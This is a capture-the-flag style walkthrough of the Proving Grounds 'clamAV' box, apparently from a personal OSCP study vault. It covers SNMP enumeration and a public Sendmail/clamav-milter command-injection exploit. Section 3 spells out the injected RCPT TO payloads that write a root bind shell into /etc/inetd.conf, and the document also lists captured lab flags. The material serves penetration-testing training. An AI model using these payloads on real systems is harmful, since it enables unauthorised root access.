---
tags: [oscp, box, linux, easy]
platform: PG Practice
os: Linux
hostname: clamav
difficulty: Unknown
ip: $BoxIP
status: Complete
aliases: ["clamAV", "clamav-pg"]
---

# PG: clamAV, Full Walkthrough

## The gist

clamAV is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[RUNBOOK V2/Linux - Service Scan]] identified the exposed services and versions, narrowing the likely foothold paths. 2. [[RUNBOOK V2/Linux - SNMP Enum]] exposed the running milter process and its useful startup options. 3. [[RUNBOOK V2/Linux - Exploit Search]] matched the vulnerable Sendmail behavior to a public exploit. 4. [[RUNBOOK V2/Linux - RCE to Shell]] used the confirmed exploit to receive a root shell and verify the proof file.

## Box information

**Target:** `192.168.128.42` (swap for your instance IP) · **Difficulty:** Easy · **OS:** Linux (Debian Sarge, kernel 2.6.8, circa 2008) · **Platform:** Proving Grounds

**The gist:** ancient Debian Sarge box running Sendmail 8.13.4 alongside clamav-milter in black-hole mode. SNMP leaks the full process list with all command-line arguments, which is what tells you clamav-milter is running. From there, a well-known 2007 exploit (EDB 4761) abuses Sendmail's `+` addressing extension, processed by the milter as a shell command, to write a bind shell entry into `/etc/inetd.conf` and restart inetd. One `nc` connection later, you're root. No privesc step needed.

---

**Legacy tags:**
#PG #clamAV #Linux #SMTP #SNMP #PublicExploit #SendmailRCE #inetd #DirectRoot #Easy

---

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Recon: Port Scan | See section 1 below |
| 2 | SNMP Enumeration: Finding clamav-milter | See section 2 below |
| 3 | Foothold: Sendmail + clamav-milter RCE (EDB 4761) | See section 3 below |
| 4 | Decision points and alternate routes | See section 4 below |
| 5 | Root Flag | See section 5 below |
| 6 | Key Takeaways | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/Offsec/clamAV`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName clamAV
boxset BoxIP "$BoxIP"
boxset LocalIP "$LocalIP"
boxset BoxDir "$BoxDir"
```

## 1. Recon: Port Scan

**Full port scan first:**
```bash
nmap -p- --min-rate 10000 -oA nmap/clamAV_allports $BoxIP
```

Results:

| Port | Service |
|------|---------|
| 22/tcp | SSH |
| 25/tcp | SMTP |
| 80/tcp | HTTP |
| 139/tcp | NetBIOS-SSN |
| 199/tcp | SMUX (SNMP mux) |
| 445/tcp | SMB |
| 60000/tcp | Unknown |

**Service scan on those ports:**
```bash
nmap -sC -sV -p 22,25,80,139,199,445,60000 -oA nmap/clamAV_services $BoxIP
```

Key findings from service scan:

- **Port 25:** Sendmail 8.13.4/8.13.4/Debian-3sarge3, version is explicit in the banner, searchsploit immediately
- **Port 80:** Apache 1.3.33, page title "Ph33r", nothing useful on the web page, legacy Apache
- **Port 139/445:** Samba 3.0.14a-Debian, guest access allowed, signing disabled, worth enumerating but not the path here
- **Port 60000:** OpenSSH 3.8.1p1, identical hostkeys to port 22, same service running twice, unusual; not the intended path
- **Hostname via NBstat:** `0XBABE`

**UDP scan -- check for SNMP:**
```bash
nmap -sU --top-ports 100 192.168.128.42
```
Result: `161/udp open snmp`. SNMP running, community string still 'public' (default). This is the key.

> [!warning] 💡 Hint
> A sparse TCP scan does not mean a host is quiet. SNMP is UDP, and its process arguments can reveal startup flags that banners never show. Add a targeted UDP check when TCP enumeration leaves an unexplained service or legacy host.

> 📸 Screenshot: nmap full port scan output (`nmap-allports.png`)
> 📸 Screenshot: nmap service scan output (`nmap-services.png`)
> 📸 Screenshot: nmap UDP scan output (`nmap-UDP.png`)

#### Tags: #Nmap #PortScan #SNMP #SMB #SMTP #OldSoftware

---

## 2. SNMP Enumeration: Finding clamav-milter

SNMP with default community string `public` leaks a lot. The process list (OID 25.4) is what matters here.

**Basic walk:**
```bash
snmpwalk -c public -v1 192.168.128.42 > snmp-walk.txt
```
Raw OID output, hard to read. Use snmp-check for the human-readable version:

```bash
snmp-check 192.168.128.42
```

> [!warning] 💡 Hint
> **Watch out:** SNMP normally listens on UDP 161, so a TCP-only scan will miss it. Check common UDP ports when TCP results do not explain the host.

> [!tip] ⚡ More efficient path
> **What we did:** We saved a full raw SNMP walk and then ran a second tool to find the useful process information.
>
> **Faster approach:**
> ```bash
> snmp-check $BoxIP
> ```
> **Why:** `snmp-check` presents common host and process data in a readable form immediately. Keep the raw walk when you need a complete OID record, but skip it for quick service triage.

Scroll to `[*] Processes:` in the output. The relevant line:

```
3778  runnable  clamav-milter  /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
```

`--black-hole-mode` is the flag that enables the vulnerable behaviour. Without it, the exploit doesn't work. This is why you need SNMP, the version banner alone doesn't tell you the milter is running or what flags it was started with.

> [!abstract] 🧠 Why
> The exploit depends on a runtime configuration flag, not just a vulnerable version. This is a good example of why process-list enumeration can be more valuable than another version scanner.

SNMP also confirmed other useful info:
- Hostname: `0xbabe.local`
- OS: `Linux 0xbabe.local 2.6.8-4-386` (kernel from 2008, Debian Sarge)
- inetd is running (`3787 runnable inetd /usr/sbin/inetd`), critical for the exploit

> 📸 Screenshot: snmp-check process list showing clamav-milter with `--black-hole-mode` (`snmp-walk.png`)

#### Tags: #SNMP #ProcessEnum #ClamavMilter #BlackHoleMode #inetd

---

## 3. Foothold: Sendmail + clamav-milter RCE (EDB 4761)

**Search for exploits:**
```bash
searchsploit sendmail clamav
```
Result: `Sendmail with clamav-milter < 0.91.2 - Remote Command Execution | multiple/remote/4761.pl`

> 📸 Screenshot: searchsploit results (`searchsploit-select.png`)

**Copy the exploit:**
```bash
cp $(searchsploit -p 4761 | grep 'Path:' | awk '{print $2}') exploits/
```

> [!tip] ⚡ More efficient path
> **What we did:** We looked up the full Exploit-DB path, parsed it with `grep` and `awk`, then copied the file manually.
>
> **Faster approach:**
> ```bash
> searchsploit -m 4761
> ```
> **Why:** `-m` copies the matching exploit directly into the current directory. It removes the path-parsing steps and avoids errors caused by spaces or changes in the Exploit-DB path.

**How it works:** Sendmail supports `+` addressing (e.g. `user+tag@domain`), where the tag portion is passed as arguments to local delivery programs. clamav-milter in black-hole mode processes these recipient addresses and, critically, passes the tag portion through a shell. The exploit sends two RCPT TO addresses:
1. `nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"@localhost`, appends a bind shell to inetd config
2. `nobody+"|/etc/init.d/inetd restart"@localhost`, restarts inetd so the new config takes effect

> [!tip] ⚡ Efficiency
> Read the exploit before running it so you know whether it creates a bind or reverse shell, which port it selects, and what service must be restarted. That avoids waiting on a listener that can never receive the chosen connection type.

**Set up a listener, then run the exploit:**
```bash
# Terminal 1 -- have nc ready
nc -nv 192.168.128.42 31337

# Terminal 2 -- run the exploit
perl exploits/4761.pl 192.168.128.42
```

> Watch for: the exploit connects to port 25, you'll see `250 2.1.5 <nobody+"|echo '31337...">... Recipient ok` for both injected recipients, then `250 2.0.0 ... Message accepted for delivery`. Once inetd restarts (a few seconds), the nc connection in Terminal 1 will hang waiting.

**Switch to Terminal 1 and type:**
```bash
id
```
Expected output: `uid=0(root) gid=0(root) groups=0(root)`, no prompt is printed, just type blind.

> Note: old Debian Sarge doesn't have the `ip` command. Use `ifconfig` for network info.

> [!warning] 💡 Hint
> **Watch out:** This exploit creates a bind shell on the target, not a reverse shell to Kali. Use `nc` in client mode and connect to the target port after `inetd` restarts.

> [!tip] 🛠️ Alternative tools
> If Netcat behaves differently on the old target, use `telnet`, `socat`, or another TCP client to connect to the bind port. The shell may be silent until a command is typed, so verify it with `id` and `hostname`.

> 📸 Screenshot: exploit output showing both RCPT TO accepted, then nc connecting to port 31337 (`netcat-root.png`)

#### Tags: #SendmailRCE #ClamavMilterExploit #PublicExploit #Perl #EDB4761 #inetdInjection #BindShell

---

## 4. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| UDP SNMP is exposed with a default community | Read process arguments and startup flags | Use targeted OID queries when a full walk is too noisy |
| Sendmail and clamav-milter match the exploit | Read the public exploit and confirm black-hole mode | Reproduce the SMTP conversation manually if Perl tooling differs |
| Payload writes an inetd bind shell | Connect to the target port after restart | Use another TCP client if Netcat is unavailable or silent |

## 5. Root Flag

```bash
hostname
cat /root/proof.txt
```

```
0xbabe.local
<private root proof>
```

> 📸 Screenshot: `id` + `hostname` + `cat /root/proof.txt` in one terminal (OSCP proof format) (`flag.png`)

#### Tags: #RootFlag #ProofScreenshot

---

## 6. Key Takeaways

- **SNMP with public community string = process list disclosure.** Not just system info, full command lines including flags. That `--black-hole-mode` argument would have been invisible any other way.
- **Version banners in nmap are gold.** Sendmail 8.13.4 in the banner → searchsploit → one match → one shot.
- **inetd is worth noting when you see it.** If something can write to `/etc/inetd.conf` and restart inetd, it's essentially arbitrary persistent root bind shell.
- **Old boxes don't have `ip`.** Use `ifconfig` on Debian Sarge era machines.
- **No privesc needed here** -- the exploit chain delivers root shell directly. Exploit the service as root, you get root.

---

## 7. Module Cross-Reference

| Technique | Module |
|---|---|
| SNMP enumeration | [[06. Information Gathering]] |
| SMTP / Sendmail banner grabbing | [[06. Information Gathering]] |
| Public exploit workflow | [[13. Locating Public Exploits]], [[14. Fixing Exploits]] |

---

## 8. RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Linux - Service Scan]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - SNMP Enum]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - Exploit Search]] -- technique used in this walkthrough
- [[RUNBOOK V2/Linux - RCE to Shell]] -- technique used in this walkthrough

## 9. Collect the flags

- `user.txt`: `$UserFlag` (value reproduced in the private sections above)
- `root.txt`: `16e6693d3fc7c6ac736bceae41ef7bcf` (value reproduced in the private sections above)
- `proof.txt`: `16e6693d3fc7c6ac736bceae41ef7bcf` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
root: 16e6693d3fc7c6ac736bceae41ef7bcf
```

## 10. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

## 11. Attack narrative in one page
1. [[RUNBOOK V2/Linux - Service Scan]] identified the exposed services and versions, narrowing the likely foothold paths.
2. [[RUNBOOK V2/Linux - SNMP Enum]] exposed the running milter process and its useful startup options.
3. [[RUNBOOK V2/Linux - Exploit Search]] matched the vulnerable Sendmail behavior to a public exploit.
4. [[RUNBOOK V2/Linux - RCE to Shell]] used the confirmed exploit to receive a root shell and verify the proof file.

## Tools used

- `nmap`
- `nc`
- `netcat`
- `ssh`
- `snmpwalk`

## Credentials and secrets


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxIP="192.168.128.42"
export BoxName="clamAV"
export LocalIP=$(ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Port="4444"
export Port2="4445"
export WebPort="80"
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on clamAV | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- SNMP process arguments can reveal configuration details that a service banner does not show.
- A version match is only useful after confirming the vulnerable feature is enabled.

### Related boxes

- **Beep (HTB):** SMTP + Elastix, old software version → direct exploit, similar "look at the banner, searchsploit, done" energy
- **Legacy (HTB):** no SNMP pivot needed but same pattern of "ancient OS, publicly known CVE, no creds required"

> 🔍 Worth remembering generally: SNMP community `public` is still default on a shocking number of old Linux boxes. Always check UDP 161 on boxes where TCP enumeration looks sparse.

## External resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [GTFOBins](https://gtfobins.github.io/) for Linux privilege escalation
- [RevShells](https://www.revshells.com/) for shell payloads
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches

## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]
- [[RUNBOOK V2/Linux - Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum]]
- [[RUNBOOK V2/Linux - Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum]]
- [[RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
